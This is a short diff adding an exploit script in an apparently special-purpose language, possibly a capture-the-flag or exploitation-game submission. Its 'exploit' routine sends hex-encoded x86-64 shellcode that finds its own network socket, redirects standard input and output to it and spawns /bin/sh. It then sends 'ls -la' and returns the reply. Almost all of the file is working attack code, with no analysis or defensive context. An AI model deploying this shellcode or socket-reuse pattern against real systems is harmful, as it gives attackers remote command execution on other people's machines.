@@ -1,0 +1,8 @@
+act exploit():
+    bv shellcode = 4831d24889d752524889e6b210524889e248ffc74831c0b0340f054885c075f14831f64889f0b0210f0548ffc64080fe0375f04831c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05hs
+    write(shellcode)
+    write("ls -la" . "\n")
+    return read(-1)
+
+submit:
+    return exploit()
